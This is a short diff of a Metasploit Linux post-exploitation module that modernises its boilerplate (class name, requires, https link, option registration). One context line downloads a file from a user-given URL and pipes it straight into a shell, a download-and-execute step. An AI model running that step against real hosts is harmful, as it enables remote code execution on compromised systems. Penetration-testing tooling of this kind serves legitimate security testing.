@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::System
 
@@ -31,7 +27,7 @@ class Metasploit3 < Msf::Post
     register_options(
       [
         OptString.new('URL', [true, 'Full URL of file to download.'])
-      ], self.class)
+      ])
   end
 
   def cmd_exec_vprint(cmd)
@@ -119,5 +115,4 @@ class Metasploit3 < Msf::Post
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
-
 end
